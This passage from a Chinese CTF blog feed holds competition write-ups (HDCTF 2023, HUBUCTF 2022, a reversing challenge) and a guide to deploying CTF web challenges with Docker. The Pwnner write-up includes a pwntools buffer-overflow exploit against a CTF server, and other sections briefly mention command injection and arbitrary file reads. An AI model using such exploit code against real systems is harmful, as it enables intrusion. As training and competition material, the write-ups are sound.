<p>hope{cA5e_anD_P0iNt_Ar3_1mp0rT4nT}</p>
<h1 id="rev">rev</h1>
<h2 id="sequence">sequence</h2>
<p><img src="http://img.hzy2003628.top/202207251147205.png" alt="image-20220725114720117"></p>
<p>跟进check()</p>
<p><img src="http://img.hzy2003628.top/202207251148196.png" alt="image-20220725114812108"></p>
<p>跟进read_numbers()</p>
<p><img src="http://img.hzy2003628.top/202207251149906.png" alt="image-20220725114944848"></p>
<p>输入a1, a1 + 4, a1 + 8, a1 + 12, a1 + 16, a1 + 20，这六个数值，判断是否满足条件，是的话就会返回flag</p>
<p>第一个数值是12，固定的，所以直接一个for循环即可找到六个数字</p>
<p><img src="http://img.hzy2003628.top/202207251158581.png" alt="image-20220725115800514"></p>
<p><img src="http://img.hzy2003628.top/202207251206739.png" alt="image-20220725120633670"></p>
<p>hope{definitely_solvable_with_angr}</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>利用Docker部署web题目</title>
    <url>/2022/06/07/Docker%E9%83%A8%E7%BD%B2web%E9%A2%98%E7%9B%AE/</url>
    <content><![CDATA[<p>记录一下使用docker出题的过程</p>
<p><img src="http://img.hzy2003628.top/20220624163835.png" alt="image693c2ec4ce219022.png"></p>
<span id="more"></span>
<h1 id="什么是docker">什么是Docker</h1>
<p>Docker 是一个开源的应用容器引擎，基于Go 语言并遵从 Apache2.0 协议开源。</p>
<p>Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。</p>
<p>容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。</p>
<p>一个完整的Docker有以下几个部分<strong>组成</strong>：</p>
<ol>
<li>DockerClient客户端</li>
<li>Docker Daemon守护进程</li>
<li>Docker Image镜像</li>
<li>DockerContainer容器</li>
</ol>
<h1 id="docker安装">Docker安装</h1>
<pre><code class="hljs plaintext">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</code></pre>
<h1 id="docker使用">Docker使用</h1>
<p>使用之前先启动docker</p>
<pre><code class="hljs plaintext">systemctl start docker</code></pre>
<p>然后拉取docker镜像</p>
<pre><code class="hljs plaintext">docker search lamp</code></pre>
<p><img src="http://img.hzy2003628.top/20220624163903.png" alt="image14304ce2a02df540.png"></p>
<blockquote>
<p>参数说明：</p>
<p>NAME: 镜像仓库源的名称</p>
<p>DESCRIPTION: 镜像的描述</p>
<p>OFFICIAL: 是否 docker 官方发布</p>
<p>stars: 推荐指数</p>
<p>AUTOMATED: 自动构建。</p>
</blockquote>
<p>使用 docker pull 命令来载入镜像</p>
<pre><code class="hljs plaintext">docker pull mattrayner/lamp</code></pre>
<p>下载之后就可查看镜像看到你下载的那个</p>
<p><img src="http://img.hzy2003628.top/202206241645734.png" alt="image95df70202579b0d2.png"></p>
<p>有这个镜像之后就可以开始创建容器</p>
<p>获取所有容器信息</p>
<pre><code class="hljs plaintext">images ps -a</code></pre>
<p>创建容器</p>
<pre><code class="hljs plaintext">docker create -p 5001:80 --name sign-in mattrayner/lamp</code></pre>
<blockquote>
<p>这个5001就是映射端口</p>
<p>sign-in是自己起的容器名</p>
</blockquote>
<p>启动容器</p>
<pre><code class="hljs plaintext">docker start sign-in</code></pre>
<p>这个时候访问5001端口就能看到启动成功，显示对应的镜像首页</p>
<p>比如我这个是这样的<img src="http://img.hzy2003628.top/202206241645528.png" alt="image2250ba84226ecc41.png"></p>
<p>接下来将题目复制到容器里面</p>
<pre><code class="hljs plaintext">docker cp ./sign-in/* sign-in:/var/www/html</code></pre>
<p>使用下面这个命令可以直接进入容器进行相关修改</p>
<pre><code class="hljs plaintext">docker exec -it 04fc bash
//但是这个要保证容器前四位不能有一样的</code></pre>
<p><img src="http://img.hzy2003628.top/202206241645520.png" alt="imageb6010bb7b6b8e69c.png"></p>
<p>但是这个时候还是只能显示镜像主页，我们需要把那个页面给删除，也就是图上的index.php</p>
<blockquote>
<p>可能会用到以下几个命令(包括但不限于这些)：</p>
<p>删除文件     rm -f 文件名</p>
<p>删除文件夹    rm -rf 文件夹名</p>
<p>新建文件 cat &gt; 文件名</p>
</blockquote>
<p>这个时候再访问端口就可以看到题目部署完成</p>
<p>为了能随时让大家访问到该站点，采用后台启动方式</p>
<pre><code class="hljs plaintext">[root@localhost CTFd]# pwd
/root/CTFd-3.5.0
[root@localhost CTFd]# nohup python3 serve.py &amp;
[1] 7129
[root@localhost CTFd]# nohup: 忽略输入并把输出追加到&quot;nohup.out&quot;

[root@localhost CTFd]#</code></pre>
<p><img src="http://img.hzy2003628.top/202206241646602.png" alt="image9e6aeb29b3e415c7.png"></p>
<blockquote>
<p><a href="https://www.runoob.com/linux/linux-comm-nohup.html">nohup 命令</a></p>
<p><strong>nohup</strong> 英文全称 no hang up（不挂起），用于在系统后台不挂断地运行命令，退出终端不会影响程序的运行。</p>
<p>语法格式:   nohup Command [ Arg … ] [　&amp; ]</p>
<p><strong>Command</strong>：要执行的命令。</p>
<p><strong>Arg</strong>：一些参数，可以指定输出文件。</p>
<p><strong>&amp;</strong>：让命令在后台执行，终端退出后命令仍旧执行。</p>
</blockquote>
<p>就·如同上边我用的这个命令来后台运行这个程序，给我的返回</p>
<pre><code class="hljs plaintext">appending output to nohup.out</code></pre>
<p>可以看到生成了 nohup.out 文件<img src="http://img.hzy2003628.top/202206241646933.png" alt="imagef5980e7715a7f8ed.png"></p>
<p>如果要停止运行，需要使用以下命令查找到 nohup 运行脚本到 PID，然后使用 kill 命令来删除：</p>
<pre><code class="hljs plaintext">ps -aux | grep &quot;runoob.sh&quot;</code></pre>
<p>参数说明：</p>
<ul>
<li>
<p><strong>a</strong> : 显示所有程序</p>
</li>
<li>
<p><strong>u</strong> : 以用户为主的格式来显示</p>
</li>
<li>
<p><strong>x</strong> : 显示所有程序，不区分终端机</p>
</li>
</ul>
<p>另外也可以使用 <strong>ps -def | grep &quot;<a href="http://runoob.sh">runoob.sh</a></strong>&quot; 命令来查找。</p>
<p>找到 PID 后，就可以使用 kill PID 来删除。</p>
<pre><code class="hljs plaintext">kill 10632  进程号PID</code></pre>
<p>鉴于考核还未开始，所以把题目测试完之后关闭所有容器，用到这个命令</p>
<pre><code class="hljs plaintext">docker stop $(docker ps -a | awk &#x27;&#123; print $1&#125;&#x27; | tail -n +2)</code></pre>
<p>一键开启使用下面这个命令</p>
<pre><code class="hljs plaintext">docker start $(docker ps -a | awk &#x27;&#123; print $1&#125;&#x27; | tail -n +2)</code></pre>
<h1 id="靶场优化">靶场优化</h1>
<p>解决CTFd页面访问慢的问题</p>
<p>原因是用了一个all.css。这个样式文件是从外网加载过来的。修改一下网址即可实现快速加载。这个样式文件的位置在：/CTFd/CTFd/themes/core/static/css下的fonts.dev.css<br>
将<br>
<code>@import url('https://use.fontawesome.com/releases/v5.9.0/css/all.css)');</code><br>
替换为<br>
<code>@import url('https://cdn.bootcss.com/font-awesome/5.13.0/css/all.css');</code><br>
然后重新启动docker<br>
<code>systemctl restart docker</code></p>
<h1 id="其他常用命令">其他常用命令</h1>
<p>停止某个容器</p>
<pre><code class="hljs plaintext">docker stop +id</code></pre>
<p>停止docker服务</p>
<pre><code class="hljs plaintext">systemctl stop docker</code></pre>
<p>修改某一个容器对应的端口</p>
<pre><code class="hljs plaintext">cd /var/lib/docker/containers/bf96392335e8*</code></pre>
<pre><code class="hljs plaintext">vim hostconfig.json</code></pre>
<p>进去之后大致是这样的</p>
<pre><code class="hljs plaintext">&#123;&quot;Binds&quot;:null,&quot;ContainerIDFile&quot;:&quot;&quot;,&quot;LogConfig&quot;:&#123;&quot;Type&quot;:&quot;journald&quot;,&quot;Config&quot;:&#123;&#125;&#125;,&quot;NetworkMode&quot;:&quot;default&quot;,&quot;PortBindings&quot;:&#123;&quot;8080/tcp&quot;:[&#123;&quot;HostIp&quot;:&quot;&quot;,&quot;HostPort&quot;:&quot;8888&quot;&#125;]&#125;,&quot;RestartPolicy&quot;:&#123;&quot;Name&quot;:&quot;no&quot;,&quot;Ma
ximumRetryCount&quot;:0&#125;,&quot;AutoRemove&quot;:false,&quot;VolumeDriver&quot;:&quot;&quot;,&quot;VolumesFrom&quot;:null,&quot;CapAdd&quot;:null,&quot;CapDrop&quot;:null,&quot;Dns&quot;:[],&quot;DnsOptions&quot;:[],&quot;DnsSearch&quot;:[],&quot;ExtraHosts&quot;:null,&quot;GroupAdd&quot;:null,&quot;IpcMode&quot;:&quot;&quot;,&quot;Cgro
up&quot;:&quot;&quot;,&quot;Links&quot;:[],&quot;OomScoreAdj&quot;:0,&quot;PidMode&quot;:&quot;&quot;,&quot;Privileged&quot;:false,&quot;PublishAllPorts&quot;:false,&quot;ReadonlyRootfs&quot;:false,&quot;SecurityOpt&quot;:null,&quot;UTSMode&quot;:&quot;&quot;,&quot;UsernsMode&quot;:&quot;&quot;,&quot;ShmSize&quot;:67108864,&quot;Runtime&quot;:&quot;docker
-runc&quot;,&quot;ConsoleSize&quot;:[0,0],&quot;Isolation&quot;:&quot;&quot;,&quot;CpuShares&quot;:0,&quot;Memory&quot;:0,&quot;NanoCpus&quot;:0,&quot;CgroupParent&quot;:&quot;&quot;,&quot;BlkioWeight&quot;:0,&quot;BlkioWeightDevice&quot;:null,&quot;BlkioDeviceReadBps&quot;:null,&quot;BlkioDeviceWriteBps&quot;:null,&quot;Blki
oDeviceReadIOps&quot;:null,&quot;BlkioDeviceWriteIOps&quot;:null,&quot;CpuPeriod&quot;:0,&quot;CpuQuota&quot;:0,&quot;CpuRealtimePeriod&quot;:0,&quot;CpuRealtimeRuntime&quot;:0,&quot;CpusetCpus&quot;:&quot;&quot;,&quot;CpusetMems&quot;:&quot;&quot;,&quot;Devices&quot;:[],&quot;DiskQuota&quot;:0,&quot;KernelMemory&quot;:0
,&quot;MemoryReservation&quot;:0,&quot;MemorySwap&quot;:0,&quot;MemorySwappiness&quot;:-1,&quot;OomKillDisable&quot;:false,&quot;PidsLimit&quot;:0,&quot;Ulimits&quot;:null,&quot;CpuCount&quot;:0,&quot;CpuPercent&quot;:0,&quot;IOMaximumIOps&quot;:0,&quot;IOMaximumBandwidth&quot;:0&#125;</code></pre>
<p>找到</p>
<pre><code class="hljs plaintext">“PortBindings”:&#123;“8080/tcp”:[&#123;“HostIp”:&quot;&quot;,“HostPort”:“8888”&#125;]&#125;</code></pre>
<blockquote>
<p>HostPort的值就是端口映射，改成需要的保存退出即可<br>
如果这样还是不行的话，那就是config.v2.json也记录了端口，把这个也修改一下爱就可以了</p>
</blockquote>
<blockquote>
<p>在进行修改端口的过程中需要先把这个容器停掉</p>
</blockquote>
<p>启动docker</p>
<pre><code class="hljs plaintext">systemctl start docker</code></pre>
<p>启动镜像</p>
<pre><code class="hljs plaintext">docker start bf96392335e8</code></pre>
<blockquote>
<p>访问出现502状态码的解决办法:</p>
<p>原因：502是报错类型代码bad gateway错误的网关</p>
<p>1.DNS缓冲，可以尝试cmd下使用<code>ipconfig /flushdns</code>刷新一下DNS缓冲</p>
<p>2.CTRL+F5强制刷新</p>
<p>刷新的原理 ：很多人可能不知道 刷新也是有两种的。所谓刷新其实就是从服务器下载数据到本地的硬盘浏览器, 再从本地硬盘种读取数据到浏览器显示给我们看。</p>
<p>①基本刷新：就是点击刷新或者使用F5快捷键,基本刷新只是从本地的硬盘重新拿取数据到浏览器，并不重新向服务器发出请求。大部分用户很多时候都是这样刷新的，遇到502报错的就没有任何效果。</p>
<p>②从服务器刷新： 如果你重新直接点击你想要浏览的网页链接，你会发现刚才还是显示502 bad getway的页面现在又可以正常浏览了！明白道理了吧？当你点击你想要浏览的网页链接的时候，是会从服务器重新下载数据的。 解决方法就是从服务器上刷新：快捷键 ctrl+F5，这样就是重新向服务器发送请求了。如果服务器能正常给予你响应你就可以看到页面了。</p>
</blockquote>
<blockquote>
<pre><code class="hljs bash"><span class="hljs-comment"># 基本操作</span>
docker run -d -p 物理端口1:容器端口1 -p 物理端口2:物理端口2 --name 容器名 &lt;image-name&gt;:&lt;tag&gt;
docker <span class="hljs-built_in">exec</span> -it 容器名/ID bash

<span class="hljs-comment"># 磁盘挂载</span>
docker run -d -p 8080:80 -v 本机路径:容器路径 --name 容器名  &lt;image-name&gt;:&lt;tag&gt;

<span class="hljs-comment"># 容器打包镜像</span>
docker commit -a <span class="hljs-string">&quot;作者&quot;</span> -m <span class="hljs-string">&quot;备注&quot;</span> 容器ID &lt;image-name&gt;:&lt;tag&gt;

<span class="hljs-comment"># 物理机拷贝到容器</span>
docker <span class="hljs-built_in">cp</span> test.txt 容器ID:/var/www/html

<span class="hljs-comment"># 容器拷贝到物理机</span>
docker <span class="hljs-built_in">cp</span> 容器ID:/var/www/html/test.txt 物理机路径

<span class="hljs-comment"># 查看容器 COMMAND</span>
 docker ps -a --no-trunc

<span class="hljs-comment"># 停止所有容器 以此类推</span>
docker stop $(dokcer ps -aq)

<span class="hljs-comment"># 将容器打包成规范的镜像</span>
docker commit &lt;exiting-Container&gt; &lt;hub-user&gt;/&lt;repo-name&gt;[:&lt;tag&gt;]

<span class="hljs-comment"># 将镜像修改成规范的镜像</span>
docker tag &lt;existing-image&gt; &lt;hub-user&gt;/&lt;repo-name&gt;[:&lt;tag&gt;]

<span class="hljs-comment"># 登录 Docker Hub</span>
docker login

<span class="hljs-comment"># 上传推送镜像到公共仓库</span>
docker push &lt;hub-user&gt;/&lt;repo-name&gt;:&lt;tag&gt;

<span class="hljs-comment"># 当前目录的 Dockerfile 创建镜像</span>
docker build -t &lt;image-name&gt;:&lt;tag&gt; . 

<span class="hljs-comment"># 指定文件构建镜像</span>
docker build -f /path/to/a/Dockerfile -t &lt;image-name&gt;:&lt;tag&gt; .

<span class="hljs-comment"># 将镜像保存 tar 包</span>
docker save -o image-name.tar &lt;image-name&gt;:&lt;tag&gt;

<span class="hljs-comment"># 导入 tar 镜像</span>
docker load --input image-name.tar

<span class="hljs-comment"># docker-compose 命令相关</span>
<span class="hljs-comment">## 基本操作</span>
docker-compose up -d

<span class="hljs-comment">## 关闭并删除容器</span>
docker-compose down

<span class="hljs-comment">## 开启|关闭|重启已经存在的由docker-compose维护的容器</span>
docker-compose start|stop|restart

<span class="hljs-comment">## 运行当前内容，并重新构建</span>
docker-compose up -d --build</code></pre>
</blockquote>
<p>其次我还在网上看到了这个方法，原理如下</p>
<blockquote>
<p>/<a href="https://blog.csdn.net/qappleh/article/details/www/server/php/80/etc/php-fpm.conf">www/server/php/80/etc/php-fpm.conf</a> request_terminate_timeout = 100 //  100–&gt;5</p>
</blockquote>
<p><a href="https://cloud.tencent.com/developer/article/1723651">php-fpm超时时间设置request_terminate_timeout资源问题分析</a></p>
<p>对此我不知道原理的说一句，貌似不要科学上网就不会出现502</p>
<p>这里附上国光的文章，对docker写的很详细</p>
<p><a href="https://www.sqlsec.com/2017/01/docker.html#toc-heading-10">Docker入门简明教程</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>漏洞测试环境搭建</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>HDCTF 2023</title>
    <url>/2023/04/23/HDCTF2023/</url>
    <content><![CDATA[<p>HDCTF 2023</p>
<span id="more"></span>
<h2 id="searchmaster">SearchMaster</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image002.png?x-oss-process=hzy" alt="img"></p>
<p>闭合命令执行得到flag</p>
<p>NSSCTF{bba9bf40-827f-49b9-9f97-46e82f0e155a}</p>
<h2 id="welcome-to-hdctf-2023">Welcome To HDCTF 2023</h2>
<p>签到题，js源码得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image003.png?x-oss-process=hzy" alt="img"></p>
<p>NSSCTF{We13ome_t@_HDCTF_2o23}</p>
<h2 id="yamiyami">YamiYami</h2>
<p>任意文件读取，读环境变量得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image005.png?x-oss-process=hzy" alt="img"></p>
<p>NSSCTF{dc72e126-c221-4b20-92de-8d26ddead12c}</p>
<h2 id="hardmisc">HardMisc</h2>
<p>签到题，010最后有base编码，解码得到flag</p>
<p>HDCTF{wE1c0w3_10_HDctf_M15c}</p>
<h2 id="pwnner">Pwnner</h2>
<p>签到题，strand伪随机数，有种子值是57，能解出固定随机数</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image007.png?x-oss-process=hzy" alt="img"></p>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

#include &lt;stdlib.h&gt;

#include &lt;time.h&gt;

 

int main() &#123;

  srand(57);

  printf(&quot;%d\n&quot;, rand());

  return 0;

&#125;</code></pre>
<p>得到随机数为1956681178</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image009.png?x-oss-process=hzy" alt="img"></p>
<p>然后剩下的就是基础的溢出到后门即可</p>
<p>Exp如下</p>
<pre><code class="hljs plaintext">from pwn import *

context.log_level=&#x27;debug&#x27;

p = remote(&#x27;node6.anna.nssctf.cn&#x27;,28700)

#p = process(&#x27;./pwnner&#x27;)

payload = b&#x27;b&#x27;*(64+8)+p64(0x4008B6)

p.recvuntil(&quot;Welc0me t0 _HDctf__\n&quot;)

rand =b&#x27;1956681178&#x27;

p.sendline(rand)

p.recvuntil(&quot;ok,you have a little cognition about pwn,so what will you do next?\n&quot;)

p.sendline(payload)

 

p.interactive()</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image011.png?x-oss-process=hzy" alt="img"></p>
<p>NSSCTF{612d3c69-453d-4092-a0af-37ee2881afaa}</p>
<h2 id="extrememisc">ExtremeMisc</h2>
<p>Binwalk分离出来一个压缩包</p>
<p>爆破压缩包密码为haida</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image012.png?x-oss-process=hzy" alt="img"></p>
<p>解压得到Reverse.piz文件</p>
<p>010分析发现hex数据需要两两进行调转</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image014.png?x-oss-process=hzy" alt="img"></p>
<p>脚本如下</p>
<pre><code class="hljs plaintext">with open(&#x27;C:/Users/25963/Desktop/00000190/Dic/Reverse.piz&#x27;, &#x27;rb&#x27;) as f:

  s = f.read()

 

t = [x // 16 + 16 * (x % 16) for x in s]

with open(&#x27;C:/Users/25963/Desktop/00000190/Dic/x.zip&#x27;, &#x27;wb&#x27;) as f:

  f.write(bytes(t))</code></pre>
<p>得到压缩包,爆破压缩包密码为9724</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image016.jpg?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image018.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image020.png?x-oss-process=hzy" alt="img">应该是明文攻击，得到解压密码w98d@ud</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image021.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image023.png?x-oss-process=hzy" alt="img"></p>
<p>HDCTF{u_a_a_master_@_c0mpRe553d_PaCKe1s}</p>
<h2 id="easy_re">easy_re</h2>
<p>UPX壳</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image025.png?x-oss-process=hzy" alt="img"></p>
<p>先进行脱壳</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image027.png?x-oss-process=hzy" alt="img"></p>
<p>Base64解码得到flag</p>
<p>HDCTF{Y0u_h@v2_//@57er3d_7he_r3v3rs3}</p>
<h2 id="easy_asm">easy_asm</h2>
<p>32位无壳</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image029.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image031.png?x-oss-process=hzy" alt="img"></p>
<p>异或，脚本如下</p>
<pre><code class="hljs plaintext">a = [
   78, 111, 116, 32, 101, 113, 117, 97, 108, 33,
   36, 69, 113, 117, 97, 108, 33, 36, 88, 84,
   83, 68, 86, 107, 90, 101, 99, 100, 79, 113,
   79, 117, 35, 99, 105, 79, 113, 67, 125, 109,
   36]
 for i in range(len(a) - 1):
   print(chr(a[i] ^ 16), end=&quot;&quot;)</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image033.png?x-oss-process=hzy" alt="img"></p>
<p>HDCTF{Just_a_e3sy_aSm}</p>
<h2 id="normal_rsa">Normal_Rsa</h2>
<p>非预期，题目自带flag</p>
<p>NSSCTF{0b3663ed-67e4-44e2-aee7-7c2d8665b63c}</p>
<h2 id="mastermisc">MasterMisc</h2>
<p>先恢复压缩包</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image035.jpg?x-oss-process=hzy" alt="img"></p>
<p>爆破密码 5483</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image036.png?x-oss-process=hzy" alt="img"></p>
<p>解压之后是个图片，fomost分离出来俩图片和一个wav音频文件</p>
<p>图片改高，得到一半flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image037.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image039.png?x-oss-process=hzy" alt="img"></p>
<p>Wav看音频频谱图得到另外一半flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image040.png?x-oss-process=hzy" alt="img"></p>
<p>搜索第三段flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230423120929597.png?x-oss-process=hzy" alt="image-20230423120929597"></p>
<p>NSSCTF{e67d8104-7536-4433-bfff-96759901c405}</p>
<h2 id="loginmaster">LoginMaster</h2>
<p>原题改的</p>
<p><a href="https://www.cnblogs.com/aninock/p/16467716.html">https://www.cnblogs.com/aninock/p/16467716.html</a><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image042.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image044.png?x-oss-process=hzy" alt="img"></p>
<p>NSSCTF{37e20899-0fbf-4ba1-a243-10de0604475e}</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2022HUBUCTF</title>
    <url>/2022/09/20/HUBUCTF%20%E6%96%B0%E7%94%9F%E8%B5%9B/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182235929.png?x-oss-process=hzy" alt="QQ20220903-232916@2x"></p>
<span id="more"></span>
<h1 id="前言">前言</h1>
<p>湖北大学新生赛，过来水水了，nss？太难了，只能来打这个了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182237832.png?x-oss-process=hzy" alt="image-20220918223700748"></p>
<h1 id="checkin">Checkin</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232663.png?x-oss-process=hzy" alt="img"></p>
<p>构造true</p>
<pre><code class="hljs plaintext">&lt;?php

$flag=array(&#x27;username&#x27;=&gt;true,&#x27;password&#x27;=&gt;true);

echo serialize($flag);

?&gt;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232668.png?x-oss-process=hzy" alt="img"></p>
<p>NSSCTF{9f0284b5-74d8-4b53-90fa-ec177bdc1b3f}</p>
<h1 id="ezpython">ezPython</h1>
<p>给了个pyc，用 uncompyle6反编译成py文件</p>
<p><a href="https://tool.lu/pyc/">python反编译 - 在线工具 (tool.lu)</a></p>
<p>反编译结果如下</p>
<pre><code class="hljs plaintext"># uncompyle6 version 3.5.0

\# Python bytecode 3.7 (3394)

\# Decompiled from: Python 2.7.5 (default, Nov 16 2020, 22:23:17) 

\# [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]

\# Embedded file name: .\ezPython.py

\# Size of source mod 2**32: 444 bytes

from Crypto.Util.number import *

import base64, base58

password = open(&#x27;password.txt&#x27;, &#x27;r&#x27;).read()

tmp = bytes_to_long(password.encode(&#x27;utf-8&#x27;))

ans = base64.b64encode(base58.b58encode(str(tmp))).decode()

print(&quot;I&#x27;ve forgot my password,could you please help me find the password?&quot;)

if ans == &#x27;M0hBajFITHVLcWV6R1BOcEM5MTR0R0J3eGZVODV6MTJjZUhGZFNHQw==&#x27;:

  print(&#x27;You get the password!&#x27;)

else:

print(&#x27;Wrong! try again&#x27;)</code></pre>
<p>逆一下那个密文，base64，base58，hex转str</p>
<pre><code class="hljs plaintext">&gt;&gt;&gt; s=&#x27;HUBUCTF@1405&#x27;

\&gt;&gt;&gt; md5(s).hexdigest()

&#x27;fd78ee3399dd6a3c1d0b637fdca0c075&#x27;</code></pre>
<p>NSSCTF{ fd78ee3399dd6a3c1d0b637fdca0c075}</p>
<h1 id="最简单的misc">最简单的misc</h1>
<p>Zsteg扫一下导出个二维码扫码得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232669.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232678.png?x-oss-process=hzy" alt="img"></p>
<p>NSSCTF{01af2547082a7c800b20123f030b2a07}</p>
<h1 id="messy_traffic">messy_traffic</h1>
<p>pcap有个zip，提取出来，从http包看到zip的密码为SignUpForHUBUMars@1405,解压缩得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232683.png?x-oss-process=hzy" alt="img"></p>
<p>NSSCTF{aacc4238460996f0178c18d7637c9dd5}</p>
<h1 id="rsaaaa">RSAaaa</h1>
<p>题目</p>
<pre><code class="hljs plaintext">就你小子是黑客？

我忘记怎么解密了！

靠你了，大黑阔！

 

(536970330703, 65537)

message: 473878130775 40132555282 40132555282 94619939727 72818765591 208015808884 42561234694 159353248388 27748063975 159353248388 159353248388 278953790403 410746718603 496849210942 27748063975 142521857906 103632267191 17774494147 328684046745 278953790403 129956887006 129956887006 366275425558 328684046745 142521857906 410746718603 142521857906 129956887006 379067009467 328684046745 159353248388 366275425558 129956887006 103632267191 27748063975 27748063975 17774494147 160623996897 278953790403 182341799525</code></pre>
<p>解题思路</p>
<p>n=536970330703</p>
<p>e=65537</p>
<p>首先先是n分解p，q，计算素数</p>
<p>在新分解</p>
<p><a href="http://www.factordb.com/index.php?query=536970330703">factordb.com</a></p>
<p>得到p=992623 q=540961</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232684.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232259.png?x-oss-process=hzy" alt="img"></p>
<p>d=66284351873</p>
<p>知道p,q,e,s一把梭如下，对N进行分解（只要知道p和q,就能解出任何rsa）</p>
<pre><code class="hljs plaintext">s=[473878130775,40132555282,40132555282,94619939727,72818765591,208015808884,42561234694,159353248388,27748063975,159353248388,159353248388,278953790403,410746718603,496849210942,27748063975,142521857906,103632267191,17774494147,328684046745,278953790403,129956887006,129956887006,366275425558,328684046745,142521857906,410746718603,142521857906,129956887006,379067009467,328684046745,159353248388,366275425558,129956887006,103632267191,27748063975,27748063975,17774494147,160623996897,278953790403,182341799525]

\&gt;&gt;&gt; e=65537

\&gt;&gt;&gt; p=992623

\&gt;&gt;&gt; q=540961

\&gt;&gt;&gt; from gmpy2 import *

\&gt;&gt;&gt; d = invert(e,(p-1)*(q-1))

\&gt;&gt;&gt; flag=[]

\&gt;&gt;&gt; for c in s:

  flag.append(pow(c,d,n))

 

\&gt;&gt;&gt; for c in s:

  flag.append(pow(c,d,p*q))

\&gt;&gt;&gt; &#x27;&#x27;.join(map(chr,flag))</code></pre>
<p>NSSCTF{08004fa8571d4669d5f56ed096788134}</p>
<h1 id="base32">base32</h1>
<p>ocr转文字，这部分很麻烦，可以先找前半部分，提取正确出来之后发现是他们学校官网简介，然后只需要剩下的找不同即可，发现中间一段不一样，那就是flag</p>
